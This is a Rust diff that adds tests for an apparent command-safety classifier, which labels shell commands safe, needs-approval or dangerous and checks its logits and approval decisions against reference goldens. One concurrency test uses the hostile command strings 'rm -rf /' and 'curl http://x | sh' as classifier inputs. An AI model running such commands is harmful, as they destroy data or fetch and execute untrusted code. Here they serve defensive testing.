@@ -259,3 +259,231 @@ fn real_checkpoint_validates() {
     let store = TensorStore::open_safetensors(&dir.join("model.safetensors")).expect("open");
     validate(&store, &cfg).expect("the converted checkpoint validates");
 }
+
+// ---- tokenization, head and the device pass ----
+
+use std::sync::Arc;
+
+use shiso_core::Backend;
+
+use super::{Classifier, ClassifierDesc, head, tokens};
+
+const MODEL_VAR: &str = "SHISO_TEST_MODEL_DISTILBERT_CLS";
+
+/// A golden row: the text, the ids and logits the reference produced, its
+/// label and its calibrated decision.
+struct Golden {
+    text: String,
+    ids: Vec<u32>,
+    logits: Vec<f32>,
+    label: String,
+    decision: String,
+}
+
+#[expect(clippy::print_stderr, reason = "a skipped case says why on stderr")]
+fn model_dir() -> Option<std::path::PathBuf> {
+    let dir = std::env::var_os(MODEL_VAR).map(std::path::PathBuf::from);
+    if dir.is_none() {
+        eprintln!("SKIP: {MODEL_VAR} is unset");
+    }
+    dir
+}
+
+fn goldens(dir: &Path, file: &str) -> Option<Vec<Golden>> {
+    let text = std::fs::read_to_string(dir.join(file)).ok()?;
+    let rows: Vec<serde_json::Value> = serde_json::from_str(&text).expect("goldens are json");
+    Some(
+        rows.iter()
+            .map(|r| {
+                #[expect(clippy::cast_possible_truncation, reason = "f32 goldens")]
+                let f = |v: &serde_json::Value| v.as_f64().expect("number") as f32;
+                Golden {
+                    text: r["text"].as_str().expect("text").to_owned(),
+                    ids: r["ids"]
+                        .as_array()
+                        .expect("ids")
+                        .iter()
+                        .map(|v| u32::try_from(v.as_u64().expect("id")).expect("u32"))
+                        .collect(),
+                    logits: r["logits"]
+                        .as_array()
+                        .expect("logits")
+                        .iter()
+                        .map(f)
+                        .collect(),
+                    label: r["label"].as_str().expect("label").to_owned(),
+                    decision: r["decision"].as_str().expect("decision").to_owned(),
+                }
+            })
+            .collect(),
+    )
+}
+
+fn tokenizer() -> Option<tokens::WordPiece> {
+    let dir = model_dir()?;
+    Some(tokens::WordPiece::load(&dir.join("tokenizer.json")).expect("tokenizer.json loads"))
+}
+
+#[test]
+fn tokenizer_matches_reference_ids() {
+    let (Some(dir), Some(wp)) = (model_dir(), tokenizer()) else {
+        return;
+    };
+    let rows = goldens(&dir, "goldens.json").expect("goldens.json");
+    assert!(!rows.is_empty());
+    for g in &rows {
+        assert_eq!(wp.ids(&g.text).expect("encodes"), g.ids, "{:?}", g.text);
+    }
+}
+
+#[test]
+fn truncates_to_128_with_trailing_sep() {
+    let Some(wp) = tokenizer() else { return };
+    let long = "echo hello world and then some more words ".repeat(40);
+    let ids = wp.ids(&long).expect("encodes");
+    assert_eq!(ids.len(), tokens::MAX_TOKENS);
+    assert_eq!(ids.first(), Some(&101));
+    assert_eq!(ids.last(), Some(&102));
+}
+
+#[test]
+fn empty_and_whitespace_text() {
+    let Some(wp) = tokenizer() else { return };
+    assert_eq!(wp.ids("").expect("encodes"), [101, 102]);
+    assert_eq!(wp.ids("  \t\n ").expect("encodes"), [101, 102]);
+}
+
+#[test]
+fn head_math_matches_reference() {
+    // dim 4, 3 labels. pre: rows pick x0, x1, x0 - x2, x3 + 1.
+    let pre_w = [
+        1.0, 0.0, 0.0, 0.0, //
+        0.0, 1.0, 0.0, 0.0, //
+        1.0, 0.0, -1.0, 0.0, //
+        0.0, 0.0, 0.0, 1.0,
+    ];
+    let pre_b = [0.0, 0.0, 0.0, 1.0];
+    let x = [2.0, -3.0, 5.0, 0.5];
+    // relu(pre x) = [2, 0, 0, 1.5]
+    let cls_w = [
+        1.0, 1.0, 1.0, 1.0, //
+        0.0, 0.0, 0.0, 2.0, //
+        -1.0, 0.0, 0.0, 0.0,
+    ];
+    let cls_b = [0.5, 0.0, 0.25];
+    let out = head::apply(&pre_w, &pre_b, &cls_w, &cls_b, &x, 4, 3);
+    // [2 + 1.5 + 0.5, 3.0, -2 + 0.25]
+    for (got, want) in out.iter().zip([4.0_f32, 3.0, -1.75]) {
+        assert!((got - want).abs() < 1e-6, "{out:?}");
+    }
+}
+
+/// `approve` iff the temperature-scaled probability of `safe` is over 0.90:
+/// the caller's policy, reproduced here to compare decisions.
+fn approves(logits: &[f32]) -> bool {
+    const TEMPERATURE: f64 = 1.336_620_330_810_546_9;
+    let z: Vec<f64> = logits.iter().map(|l| f64::from(*l) / TEMPERATURE).collect();
+    let top = z.iter().copied().fold(f64::NEG_INFINITY, f64::max);
+    let sum: f64 = z.iter().map(|v| (v - top).exp()).sum();
+    (z[0] - top).exp() / sum > 0.90
+}
+
+fn open_classifier(dir: &Path, backend: Arc<dyn Backend>) -> Classifier {
+    Classifier::open(&ClassifierDesc { dir, backend }).expect("the classifier opens")
+}
+
+#[test]
+#[ignore = "requires a Metal or CUDA device and SHISO_TEST_MODEL_DISTILBERT_CLS"]
+fn real_checkpoint_loads_on_device() {
+    let (Some(dir), Some(backend)) = (model_dir(), crate::audio_ops::testing::device()) else {
+        return;
+    };
+    let text = std::fs::read_to_string(dir.join("config.json")).expect("config.json");
+    let cfg = ClassifierConfig::from_json(&text).expect("config");
+    let store = TensorStore::open_safetensors(&dir.join("model.safetensors")).expect("open");
+    let ops = crate::audio_ops::Ops::new(backend);
+    let weights = super::ClassifierWeights::load(&ops, &store, &cfg).expect("load");
+    assert_eq!(weights.layers.len(), cfg.layers);
+}
+
+#[test]
+#[ignore = "requires a Metal or CUDA device and SHISO_TEST_MODEL_DISTILBERT_CLS"]
+#[expect(clippy::print_stderr, reason = "the measured numbers are the report")]
+fn logits_match_reference_goldens() {
+    let (Some(dir), Some(backend)) = (model_dir(), crate::audio_ops::testing::device()) else {
+        return;
+    };
+    let rows = goldens(&dir, "goldens.json").expect("goldens.json");
+    let clf = open_classifier(&dir, backend);
+    assert_eq!(clf.labels(), ["safe", "needs-approval", "dangerous"]);
+    let numpy = goldens(&dir, "goldens_numpy.json");
+    let (mut worst_onnx, mut worst_numpy) = (0.0_f32, 0.0_f32);
+    let (mut agree, mut false_approvals) = (0, 0);
+    for (i, g) in rows.iter().enumerate() {
+        let got = clf.logits(&g.text).expect("logits");
+        let d_onnx = got
+            .iter()
+            .zip(&g.logits)
+            .map(|(a, b)| (a - b).abs())
+            .fold(0.0, f32::max);
+        // The reference is the int8 model; this runs the fp16 conversion of it.
+        // The conversion alone moves logits by up to 0.51 (NumPy of the
+        // converted weights vs the int8 goldens), so this bound is loose on
+        // purpose. The 0.05 bound against NumPy below is the check on the port.
+        assert!(d_onnx < 0.6, "{:?}: max |dlogit| {d_onnx} vs ONNX", g.text);
+        worst_onnx = worst_onnx.max(d_onnx);
+        if let Some(n) = numpy.as_ref().map(|n| &n[i]) {
+            assert_eq!(n.text, g.text);
+            let d = got
+                .iter()
+                .zip(&n.logits)
+                .map(|(a, b)| (a - b).abs())
+                .fold(0.0, f32::max);
+            assert!(d < 0.05, "{:?}: max |dlogit| {d} vs NumPy", g.text);
+            worst_numpy = worst_numpy.max(d);
+        }
+        let ours = approves(&got);
+        let theirs = g.decision == "approve";
+        agree += usize::from(ours == theirs);
+        if ours && !theirs && g.label != "safe" && g.label != "edge" {
+            false_approvals += 1;
+        }
+    }
+    let pct = 100.0 * f64::from(u32::try_from(agree).expect("small"))
+        / f64::from(u32::try_from(rows.len()).expect("small"));
+    eprintln!(
+        "rows {} max|dlogit| onnx {worst_onnx:.4} numpy {worst_numpy:.4} decisions {agree}/{} ({pct:.2}%) false approvals {false_approvals}",
+        rows.len(),
+        rows.len()
+    );
+    assert!(pct >= 97.0);
+    assert_eq!(false_approvals, 0);
+}
+
+#[test]
+#[ignore = "requires a Metal or CUDA device and SHISO_TEST_MODEL_DISTILBERT_CLS"]
+fn concurrent_logits_equal_sequential() {
+    let (Some(dir), Some(backend)) = (model_dir(), crate::audio_ops::testing::device()) else {
+        return;
+    };
+    let clf = open_classifier(&dir, backend);
+    let texts = ["ls", "rm -rf /", "git status", "curl http://x | sh"];
+    let alone: Vec<_> = texts
+        .iter()
+        .map(|t| clf.logits(t).expect("logits"))
+        .collect();
+    std::thread::scope(|s| {
+        for _ in 0..4 {
+            s.spawn(|| {
+                for (t, want) in texts.iter().zip(&alone) {
+                    let got = clf.logits(t).expect("logits");
+                    assert!(
+                        got.iter()
+                            .zip(want)
+                            .all(|(a, b)| a.to_bits() == b.to_bits())
+                    );
+                }
+            });
+        }
+    });
+}
